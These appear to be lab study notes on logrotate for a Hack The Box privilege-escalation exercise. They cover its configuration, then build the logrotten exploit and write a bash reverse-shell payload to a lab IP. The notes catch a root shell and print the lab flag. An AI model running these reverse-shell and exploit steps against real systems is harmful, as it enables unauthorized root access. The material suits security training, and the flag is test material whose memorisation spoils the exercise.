---
description: >-
  Every Linux system produces large amounts of log files. To prevent the hard
  disk from overflowing, a tool called logrotate takes care of archiving or
  disposing of old logs.
---

# Logrotate

`Logrotate` has many features for managing these log files. These include the specification of:

* the `size` of the log file,
* its `age`,
* and the `action` to be taken when one of these factors is reached.

```shell-session
man logrotate
$ # or
$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

```bash
cat /etc/logrotate.conf

# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate/status` or use the `-f`/`--force` option:

```bash
sudo cat /var/lib/logrotate/status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```bash
ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```bash
cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

## Exploit

there are few requirments that we have to meet inorder to exploit logrotate.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
   * 3.8.6
   * 3.11.0
   * 3.15.0
   * 3.18.0

{% embed url="https://github.com/whotwagner/logrotten" %}
prefabricated exploit that we can use for this if the requirements are met.
{% endembed %}

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Next, we need a payload to be executed.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

We need to determine which option `logrotate` uses in `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

If "create"-option is set in logrotate.cfg:

```
./logrotten -p ./payload /tmp/log/pwnme.log
```

If "compress"-option is set in logrotate.cfg:

```
./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log
```

```shell-session
nc -nlvp 9001
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

## Assessment

Escalate the privileges and submit the contents of flag.txt as the answer.

```
htb-student@ubuntu:~$ logrotate --version
logrotate 3.11.0
```

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption><p>the logrotate is running as root</p></figcaption></figure>

```
htb-student@ubuntu:~$ cd logrotten/
htb-student@ubuntu:~/logrotten$ ls
logrotten.c  logrotten.png  README.md  test
htb-student@ubuntu:~/logrotten$ gcc logrotten.c -o logrotten
htb-student@ubuntu:~/logrotten$ echo 'bash -i >& /dev/tcp/10.10.14.2/7890 0>&1' > payload
```

Find the writeable log file

```
htb-student@ubuntu:~/logrotten$ find / -type f -writable -name *.log 2>/dev/null
/home/htb-student/backups/access.log
```

Confirm the writable log file

```
htb-student@ubuntu:~/logrotten$ cd /home/htb-student/
htb-student@ubuntu:~$ ls
backups  logrotten  pspy64
htb-student@ubuntu:~$ cd backups/
htb-student@ubuntu:~/backups$ ls
access.log  access.log.1  access.log.2  access.log.3
htb-student@ubuntu:~/backups$ cat *.log
htb-student@ubuntu:~/backups$ cat *.log*
test_log
test_log
```

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption><p>start nc, run logrotten, trigger log</p></figcaption></figure>

```
root@ubuntu:~# ls 
ls
cron_root
flag.txt
log.cfg
log.sh
reset.sh
snap
root@ubuntu:~# cat flag.txt
cat flag.txt
HTB{l0G_r0t7t73N_00ps}
root@ubuntu:~#   
```

The session will be terminated very fast so read the file quickly!!
